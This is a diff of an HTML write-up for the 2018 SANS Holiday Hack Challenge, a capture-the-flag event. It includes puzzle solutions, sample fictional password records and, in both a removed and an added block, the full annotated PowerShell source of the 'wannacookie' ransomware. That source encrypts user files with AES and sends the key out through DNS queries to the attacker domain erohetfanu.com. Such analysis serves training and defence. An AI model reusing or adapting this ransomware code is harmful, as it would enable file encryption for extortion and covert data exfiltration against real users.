+INSERT INTO passwords VALUES('alabaster@kringlecastle.com','PetsEatCookiesTOo@813','neopets.com');
+INSERT INTO passwords VALUES('alabaster@kringlecastle.com','YayImACoder1926','www.codecademy.com');
+INSERT INTO passwords VALUES('alabaster@kringlecastle.com','Woootz4Cookies19273','www.4chan.org');
+INSERT INTO passwords VALUES('alabaster@kringlecastle.com','ChristMasRox19283','www.reddit.com');
+COMMIT;</pre>
+        <p>It looks like our file was decrypted and now we have access to the SQLite database that held Alabaster's passwords.</p>
+        <button class="btn btn-success">ED#ED#EED#EF#G#F#G#ABA#BA#B</button>
       </div>
 
       <div class="border p-2 m-2">
@@ -1185,6 +1553,11 @@ iex($(H2A $h | Out-string))</pre>
         </div>
         <p>Use what you have learned from previous challenges to open the <a href="https://pianolockn.kringlecastle.com/">door to Santa's vault</a>. What message do you get when you unlock the door?</p>
         <hr class="my-4">
+        <p>Now that we have the password for the piano lock we should open Santa's vault. Trying this sequence actually does nothing. Something must be amiss. If we recall Holly's email to Alabaster, his favorit key is D and the pdf she sent was about transcribing music. So let's transcribe from E to D.</p>
+        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">E D# E D# E E D# E F# G# F# G# A B A# B A# B
+D C# D C# D D C# D E F# E F# G A G# A G# A</pre>
+        <p>This sequence DOES unlock the door and faintly reminds me of Rachmaninoff... Er, I mean Mozart... Darn Mrs. Teevee throwing me off...</p>
+        <button class="btn btn-success">You have unlocked Santa's vault!</button>
       </div>
     </div>
 
@@ -3467,11 +3840,21 @@ Congratulations! You've won, and have successfully completed this challenge.</pr
 
       </div>
       <div class="border rounded p-2 m-2">
-        <h2><a id="termVentMaze"></a>Google Ventilation</h2>
-        <a href="https://vents.kringlecastle.com?challenge=ventmaze&id=false" target="_blank" class="btn btn-info">Click here to open the Google Ventilation Maze in a new window</a>
+        <h2><a id="termVentMaze"></a>Google Vent Maze</h2>
+        <a href="https://vents.kringlecastle.com?challenge=ventmaze" target="_blank" class="btn btn-info">Click here to open the Google Ventilation Maze in a new window</a>
         <p>There are two ways to solve this puzzle. The first is the brute force method. Simply traverse the vents until you hit a wall and turn around mapping your progress on graph paper. The second method is finding a map and that can be found in the the zip file provided in the <a href="#obj4">git repository provided by Challenge 4</a></p>
-        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
-        </pre>
+        <div class="row">
+          <div class="col-6">
+            <h2 class="text-center">First floor</h2>
+            <img class="img-fluid" src="images/ventilation_diagram_1F.jpg">
+          </div>
+          <div class="col-6">
+            <h2 class="text-center">Second floor</h2>
+            <img class="img-fluid" src="images/ventilation_diagram_2F.jpg">
+          </div>
+        </div>
+
+        <p>The entrance to the vents are by the Google desk in the main lobby. The bottom right corner of the first floor map is the starting point. You need to make your way to the <b>2</b> which gets you to the second floor vent maze through an openning upward. You exit the second floor maze in the pink circle on the right side of the map. The exit pops you out in the room with Santa, Alabaster and a snow covered Hans. This is a good way to get into that room if you're having trouble with the scan-o-matic.</p>
       </div>
     </div>
 
@@ -3708,259 +4091,190 @@ try
       </div>
 
       <div class="border rounded p-2 m-2">
-        <h2><a id="artWannacookie"></a>Wannacookie Source Code</h2>
-        <a href="#obj93" class="btn btn-info">Objective 9.3</a>
-        <p>This is a breakdown of the <a href="artefacts/wannacookie.ps1">wannacookie.ps1</a></p> source code.</p>
-        <pre class="border text-light bg-dark p-2" style="white-space: pre-wrap">$functions = {
-            function Enc_Dec-File($key, $File, $enc_it) {
-                [byte[]]$key = $key
-                $Suffix = "`.wannacookie"
-                [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
-                [System.Int32]$KeySize = $key.Length*8
-                $AESP = New-Object 'System.Security.Cryptography.AesManaged'
-                $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC
-                $AESP.BlockSize = 128
-                $AESP.KeySize = $KeySize
-                $AESP.Key = $key
-                $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open)
-                if ($enc_it) {$DestFile = $File + $Suffix} else {$DestFile = ($File -replace $Suffix)}
-                $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create)
-                if ($enc_it) {
-                    $AESP.GenerateIV()
-                    $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4)
-                    $FileSW.Write($AESP.IV, 0, $AESP.IV.Length)
-                    $Transform = $AESP.CreateEncryptor()
-                } else {
-                    [Byte[]]$LenIV = New-Object Byte[] 4
-                    $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
-                    $FileSR.Read($LenIV,  0, 3) | Out-Null
-                    [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
-                    [Byte[]]$IV = New-Object Byte[] $LIV
-                    $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
-                    $FileSR.Read($IV, 0, $LIV) | Out-Null
-                    $AESP.IV = $IV
-                    $Transform = $AESP.CreateDecryptor()
-                }
-                $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
-                [Int]$Count = 0
-                [Int]$BlockSzBts = $AESP.BlockSize / 8
-                [Byte[]]$Data = New-Object Byte[] $BlockSzBts
-                Do
-                {
-                    $Count = $FileSR.Read($Data, 0, $BlockSzBts)
-                    $CryptoS.Write($Data, 0, $Count)
-                }
-                While ($Count -gt 0)
-                $CryptoS.FlushFinalBlock()
-                $CryptoS.Close()
-                $FileSR.Close()
-                $FileSW.Close()
-                Clear-variable -Name "key"
-                Remove-Item $File
-            }
-        function H2B {
-            param($HX)
-            $HX = $HX -split '(..)' | ? { $_ }
-            ForEach ($value in $HX){
-                [Convert]::ToInt32($value,16)
-            }
-        function A2H(){
-            Param($a)
-            $c = ''
-            $b = $a.ToCharArray();
-            Foreach ($element in $b) {
-                $c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
-            }
-            return $c -replace ' '
-        function H2A() {
-            Param($a)
-            $outa
-            $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_}
-            return $outa
-        function B2H {
-            param($DEC)
-            $tmp = ''
-            ForEach ($value in $DEC){
-                $a = "{0:x}" -f [Int]$value
-                if ($a.length -eq 1){
-                    $tmp += '0' + $a
-                } else {
-                    $tmp += $a
-                }
-            }
-            return $tmp
-        function ti_rox {
-            param($b1, $b2)
-            $b1 = $(H2B $b1)
-            $b2 = $(H2B $b2)
-            $cont = New-Object Byte[] $b1.count
-            if ($b1.count -eq $b2.count) {
-                for($i=0; $i -lt $b1.count ; $i++)
-                {
-                    $cont[$i] = $b1[$i] -bxor $b2[$i]
-                }
-            }
-            return $cont
-        function B2G {
-            param([byte[]]$Data)
-            Process {
-            $out = [System.IO.MemoryStream]::new()
-            $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress)
-              $gStream.Write($Data, 0, $Data.Length)
-              $gStream.Close()
-            return $out.ToArray()
-        function G2B {
-        param([byte[]]$Data)
-        	Process {
-                $SrcData = New-Object System.IO.MemoryStream( , $Data )
-        	    $output = New-Object System.IO.MemoryStream
-                $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress)
-        	    $gStream.CopyTo( $output )
-                $gStream.Close()
-        		$SrcData.Close()
-        		[byte[]] $byteArr = $output.ToArray()
-                return $byteArr
-            }
-        function Sha1([String] $String) {
-            $SB = New-Object System.Text.StringBuilder
-                [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
-                [Void]$SB.Append($_.ToString("x2"))
-            }
-            $SB.ToString()
-        function Pub_Key_Enc($key_bytes, [byte[]]$pub_bytes){
-             $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
-             $cert.Import($pub_bytes)
-             $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true)
-             return $(B2H $encKey)
-        function enc_dec {
-            param($key, $allfiles, $make_cookie )
-            $tcount = 12
-            for ( $file=0; $file -lt $allfiles.length; $file++  ) {
-                while ($true) {
-                    $running = @(Get-Job | Where-Object { $_.State -eq 'Running' })
-                    if ($running.Count -le $tcount) {
-                        Start-Job  -ScriptBlock {
-                            param($key, $File, $true_false)
-                            try{
-                                Enc_Dec-File $key $File $true_false
-                            } catch {
-                                $_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
-                            }
-                        } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions
-                        break
-                    } else {
-                        Start-Sleep -m 200
-                        continue
-                    }
-                }
-            }
-        function get_over_dns($f) {
-            $h = ''
-            foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {
-                $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
-            }
-            return (H2A $h)
-        function split_to_chunks($astring, $size=32) {
-            $new_arr = @()
-            $chunk_index=0
-            foreach($i in 1..$($astring.length / $size)) {
-                $new_arr += @($astring.substring($chunk_index,$size))
-                $chunk_index += $size
-            }
-            return $new_arr
-        function send_key($encrypted_key) {
-            $chunks = (split_to_chunks $encrypted_key )
-            foreach ($j in $chunks) {
-                if ($chunks.IndexOf($j) -eq 0) {
-                    $new_cookie = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
-                } else {
-                    $(Resolve-DnsName -Server erohetfanu.com -Name "$new_cookie.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
-                }
-            }
-            return $new_cookie
-        function wannacookie {
-            $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"
-            if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return}
-            if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {return}
-            $pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
-            $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
-            $Hex_key = $(B2H $Byte_key)
-            $Key_Hash = $(Sha1 $Hex_key)
-            $Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
-            $cookie_id = (send_key $Pub_key_encrypted_Key)
-            $date_time = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n")
-            [array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
-            enc_dec $Byte_key $future_cookies $true
-            Clear-variable -Name "Hex_key"
-            Clear-variable -Name "Byte_key"
-            $lurl = 'http://127.0.0.1:8080/'
-            $htmlcontents = @{
-                'GET /'  =  $(get_over_dns (A2H "source.min.html"))
-                'GET /close'  =  '<p>Bye!</p>'
-            }
-            Start-Job -ScriptBlock{
-                param($url)
-                    Start-Sleep 10
-                    Add-type -AssemblyName System.Windows.Forms
-                    start-process "$url" -WindowStyle Maximized
-                    Start-sleep 2
-                    [System.Windows.Forms.SendKeys]::SendWait("{F11}")
-            } -Arg $lurl
-            $listener = New-Object System.Net.HttpListener
-            $listener.Prefixes.Add($lurl)
-            $listener.Start()
-            try {
-                $close = $false
-                while ($listener.IsListening) {
-                    $context = $listener.GetContext()
-                    $Req = $context.Request
-                    $Resp = $context.Response
-                    $Resp.Headers.Add("Access-Control-Allow-Origin","*")
-                    $received = '{0} {1}' -f $Req.httpmethod, $Req.url.localpath
-                    if ($received -eq 'GET /') {
-                        $html = $htmlcontents[$received]
-                    } elseif ($received -eq 'GET /decrypt') {
-                        $akey = $Req.QueryString.Item("key")
-                        if ($Key_Hash -eq $(Sha1 $akey)) {
-                            $akey = $(H2B $akey)
-                            [array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
-                            enc_dec $akey $allcookies $false
-                            $html = "Files have been decrypted!"
-                            $close = $true
-                        } else {
-                            $html = "Invalid Key!"
-                        }
-                    } elseif ($received -eq 'GET /close') {
-                        $close = $true
-                        $html = $htmlcontents[$received]
-                    } elseif ($received -eq 'GET /cookie_is_paid') {
-                        $cookie_and_key = $(Resolve-DnsName -Server erohetfanu.com -Name ("$cookie_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings
-                        if ( $cookie_and_key.length -eq 32 ) {
-                            $html = $cookie_and_key
-                        } else {
-                            $html = "UNPAID|$cookie_id|$date_time"
-                        }
-                    } else {
-                        $Resp.statuscode = 404
-                        $html = '&lt;h1&gt;404 Not Found&lt;/h1&gt;'
-                    }
-                    $buffer = [Text.Encoding]::UTF8.GetBytes($html)
-                    $Resp.ContentLength64 = $buffer.length
-                    $Resp.OutputStream.Write($buffer, 0, $buffer.length)
-                    $Resp.Close()
-                    if ($close) {
-                        $listener.Stop()
-                        return
-                    }
-                }
-            } finally {
-                $listener.Stop()
-            }
-        wannacookie</pre>
+        <div class="dropdown">
+          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+            <a id="artWannacookie"></a>Wannacookie Source Code
+          </button>
+          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
+            <a class="dropdown-item" href="#obj93">Objective 9.3</a>
+          </div>
+        </div>
+        <p>This is a breakdown of the <a href="artefacts/wannacookie.min.ps1">wannacookie.min.ps1</a> source code. We were also able to download a file called <a href="artefacts/wannacookie.ps1">wannacookie.ps1</a> which appears to be a non-minimized version of the <code>wannacookie.min.ps1</code> file. It doesn't work as is, but many of the functions are fully named as opposed to moderately obfuscated. For example the function <kbd>p_k_e</kbd> in the <b>.min</b> file is <kbd>Pub_Key_Enc</kbd> in the other file. Mouse over the different functions to get an idea of what they do.</p>
+        <p>One additional note about this malware is that it doesn't appear to mix of the letters of "hansgruber" as we saw in the snort challenge. Perhaps that's in wannacookie 2.0? :)</p>
+        <pre class="border text-light bg-dark p-2" style="white-space: pre-wrap">
+$functions = {
+  <span data-toggle="tooltip" title="Encode and Decode File">function e_d_file ($key,$File,$enc_it) {
+    [byte[]]$key = $key;
+    $Suffix = "`.wannacookie";
+    [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
+    [System.Int32]$KeySize = $key.Length * 8;
+    $AESP = New-Object 'System.Security.Cryptography.AesManaged';
+    $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
+    $AESP.BlockSize = 128;
+    $AESP.KeySize = $KeySize;
+    $AESP.Key = $key;
+    $FileSR = New-Object System.IO.FileStream ($File,[System.IO.FileMode]::Open);
+    if ($enc_it) {
+      $DestFile = $File + $Suffix
+    } else {
+      $DestFile = ($File -replace $Suffix)
+    };
+    $FileSW = New-Object System.IO.FileStream ($DestFile,[System.IO.FileMode]::Create);
+    if ($enc_it) {
+      $AESP.GenerateIV();
+      $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length),0,4);
+      $FileSW.Write($AESP.IV,0,$AESP.IV.Length);
+      $Transform = $AESP.CreateEncryptor() } else { [Byte[]]$LenIV = New-Object Byte[] 4;
+      $FileSR.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null;
+      $FileSR.Read($LenIV,0,3) | Out-Null;
+      [int]$LIV = [System.BitConverter]::ToInt32($LenIV,0);
+      [Byte[]]$IV = New-Object Byte[] $LIV;
+      $FileSR.Seek(4,[System.IO.SeekOrigin]::Begin) | Out-Null;
+      $FileSR.Read($IV,0,$LIV) | Out-Null;
+      $AESP.IV = $IV;
+      $Transform = $AESP.CreateDecryptor() };
+    $CryptoS = New-Object System.Security.Cryptography.CryptoStream ($FileSW,$Transform,[System.Security.Cryptography.CryptoStreamMode]::Write);
+    [int]$Count = 0;
+    [int]$BlockSzBts = $AESP.BlockSize / 8;
+    [Byte[]]$Data = New-Object Byte[] $BlockSzBts;
+    do {
+      $Count = $FileSR.Read($Data,0,$BlockSzBts);
+      $CryptoS.Write($Data,0,$Count)
+    } while ($Count -gt 0);
+    $CryptoS.FlushFinalBlock();
+    $CryptoS.Close();
+    $FileSR.Close();
+    $FileSW.Close();
+    Clear-Variable -Name "key";
+    Remove-Item $File } };</span>
+<span data-toggle="tooltip" title="Hex to Byte array">function H2B { param($HX);
+  $HX = $HX -split '(..)' | Where-Object { $_ };
+  foreach ($value in $HX) { [Convert]::ToInt32($value,16) } };</span>
+<span data-toggle="tooltip" title="ASCII to Hex">function A2H () { param($a);
+  $c = '';
+  $b = $a.ToCharArray();
+  ;
+  foreach ($element in $b) { $c = $c + " " + [System.String]::Format("{0:X}",[System.Convert]::ToUInt32($element)) };
+  return $c -replace ' ' };</span>
+<span data-toggle="tooltip" title="Hex to ASCII">function H2A () { param($a);
+  $outa;
+  $a -split '(..)' | Where-Object { $_ } | ForEach-Object { [char]([convert]::ToInt16($_,16)) } | ForEach-Object { $outa = $outa + $_ };
+  return $outa };</span>
+<span data-toggle="tooltip" title="Byte array to Hex">function B2H { param($DEC);
+  $tmp = '';
+  foreach ($value in $DEC) { $a = "{0:x}" -f [int]$value;
+    if ($a.Length -eq 1) { $tmp += '0' + $a } else { $tmp += $a } };
+  return $tmp };</span>
+<span data-toggle="tooltip" title="XOR Function">function ti_rox { param($b1,$b2);
+  $b1 = $(H2B $b1);
+  $b2 = $(H2B $b2);
+  $cont = New-Object Byte[] $b1.count;
+  if ($b1.count -eq $b2.count) {
+    for ($i = 0; $i -lt $b1.count; $i++) { $cont[$i] = $b1[$i] -bxor $b2[$i] } };
+  return $cont };</span>
+<span data-toggle="tooltip" title="Byte array to a Gzip stream">function B2G { param([byte[]]$Data);
+  process { $out = [System.IO.MemoryStream]::new();
+    $gStream = New-Object System.IO.Compression.GzipStream $out,([IO.Compression.CompressionMode]::Compress);
+    $gStream.Write($Data,0,$Data.Length);
+    $gStream.Close();
+    return $out.ToArray() } };</span>
+<span data-toggle="tooltip" title="Gzip stream to a Byte array">function G2B { param([byte[]]$Data);
+  process { $SrcData = New-Object System.IO.MemoryStream (,$Data);
+    $output = New-Object System.IO.MemoryStream;
+    $gStream = New-Object System.IO.Compression.GzipStream $SrcData,([IO.Compression.CompressionMode]::Decompress);
+    $gStream.CopyTo($output);
+    $gStream.Close();
+    $SrcData.Close();
+    [byte[]]$byteArr = $output.ToArray();
+    return $byteArr } };</span>
+<span data-toggle="tooltip" title="SHA1">function sh1 ([string]$String) { $SB = New-Object System.Text.StringBuilder;
+  [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String)) | ForEach-Object { [void]$SB.Append($_.ToString("x2")) };
+  $SB.ToString() };</span>
+<span data-toggle="tooltip" title="Public Key Encryption">function p_k_e ($key_bytes,[byte[]]$pub_bytes) { $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
+  $cert.Import($pub_bytes);
+  $encKey = $cert.PublicKey.Key.Encrypt($key_bytes,$true);
+  return $(B2H $encKey) };</span>
+<span data-toggle="tooltip" title="Encode and Decode">function e_n_d { param($key,$allfiles,$make_cookie);
+  $tcount = 12;
+  for ($file = 0;
+    $file -lt $allfiles.Length;
+    $file++) { while ($true) { $running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
+      if ($running.count -le $tcount) { Start-Job -ScriptBlock { param($key,$File,$true_false);
+          try { e_d_file $key $File $true_false } catch { $_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -Append } } -args $key,$allfiles[$file],$make_cookie -InitializationScript $functions;
+        break } else { Start-Sleep -m 200;
+        continue } } } };</span>
+<span data-toggle="tooltip" title="Get over DNS">function g_o_dns ($f) { $h = '';
+  foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings,10) - 1)) { $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings };
+  return (H2A $h) };</span>
+<span data-toggle="tooltip" title="Split into chunks">function s_2_c ($astring,$size = 32) { $new_arr = @();
+  $chunk_index = 0;
+  foreach ($i in 1..$($astring.Length / $size)) { $new_arr += @($astring.substring($chunk_index,$size));
+    $chunk_index += $size };
+  return $new_arr };</span>
+<span data-toggle="tooltip" title="Send key to C2">function snd_k ($enc_k) { $chunks = (s_2_c $enc_k);
+  foreach ($j in $chunks) { if ($chunks.IndexOf($j) -eq 0) { $n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings } else { $(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings } };
+  return $n_c_id };</span>
+<span data-toggle="tooltip" title="Wannacookie!">function wanc {
+  $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
+  if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) { return };
+  if ($(netstat -ano | Select-String "127.0.0.1:8080").Length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") { return };
+  $p_k = [System.Convert]::FromBase64String($(g_o_dns ("7365727665722E637274")));
+  $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort { Get-Random })[0..15] -join '')) | Where-Object { $_ -ne 0x00 });
+  $h_k = $(B2H $b_k);
+  $k_h = $(sh1 $h_k);
+  $p_k_e_k = (p_k_e $b_k $p_k).ToString();
+  $c_id = (snd_k $p_k_e_k);
+  $d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");
+  [array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile + '\Desktop'),$($env:userprofile + '\Documents'),$($env:userprofile + '\Videos'),$($env:userprofile + '\Pictures'),$($env:userprofile + '\Music')) -Recurse | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName });
+  e_n_d $b_k $f_c $true;
+  Clear-Variable -Name "h_k";
+  Clear-Variable -Name "b_k";
+  $lurl = 'http://127.0.0.1:8080/';
+  $html_c = @{ 'GET /' = $(g_o_dns (A2H "source.min.html"));
+    'GET /close' = '&lt;p&gt;Bye!&lt;/p&gt;' };
+  Start-Job -ScriptBlock { param($url);
+    Start-Sleep 10;
+    Add-Type -AssemblyName System.Windows.Forms;
+    Start-Process "$url" -WindowStyle Maximized;
+    Start-Sleep 2;
+    [System.Windows.Forms.SendKeys]::SendWait("{F11}") } -Arg $lurl;
+  $list = New-Object System.Net.HttpListener;
+  $list.Prefixes.Add($lurl);
+  $list.Start();
+  try { $close = $false;
+    while ($list.IsListening) { $context = $list.GetContext();
+      $Req = $context.Request;
+      $Resp = $context.Response;
+      $recvd = '{0} {1}' -f $Req.httpmethod,$Req.url.localpath;
+      if ($recvd -eq 'GET /') { $html = $html_c[$recvd] } elseif ($recvd -eq 'GET /decrypt') { $akey = $Req.QueryString.Item("key");
+        if ($k_h -eq $(sh1 $akey)) { $akey = $(H2B $akey);
+          [array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse -Filter *.wannacookie | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName });
+          e_n_d $akey $f_c $false;
+          $html = "Files have been decrypted!";
+          $close = $true } else { $html = "Invalid Key!" } } elseif ($recvd -eq 'GET /close') { $close = $true;
+        $html = $html_c[$recvd] } elseif ($recvd -eq 'GET /cookie_is_paid') { $c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings;
+        if ($c_n_k.Length -eq 32) { $html = $c_n_k } else { $html = "UNPAID|$c_id|$d_t" } } else { $Resp.statuscode = 404;
+        $html = '&lt;h1&gt;404 Not Found&lt;/h1&gt;' };
+      $buffer = [Text.Encoding]::UTF8.GetBytes($html);
+      $Resp.ContentLength64 = $buffer.Length;
+      $Resp.OutputStream.Write($buffer,0,$buffer.Length);
+      $Resp.Close();
+      if ($close) { $list.Stop();
+        return } } } finally { $list.Stop() } };</span>
+wanc;</pre>
       </div>
       <div class="border rounded p-2 m-2">
-        <h2><a id="artZipFile"></a>Memory Dump and WannaCookie encrypted database</h2>
-        <a href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip" class="btn btn-info">forensic_artifacts.zip</a>
+        <div class="dropdown">
+          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+            <a id="artWannacookieHTML"></a>Wannacookie Source HTML Code
+          </button>
+          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
+            <a class="dropdown-item" href="#obj93">Objective 9.3</a>
+          </div>
+        </div>
+        <p>Using the g_o_dns function we can also download source.html and source.min.html. They are included here for your personal analysis.</p>
+        <a class="btn btn-info" href="artefacts/source.min.html" target="_blank">source.min.html</a>
+        <a class="btn btn-info" href="artefacts/source.html" target="_blank">source.html</a>
       </div>
     </div>
 
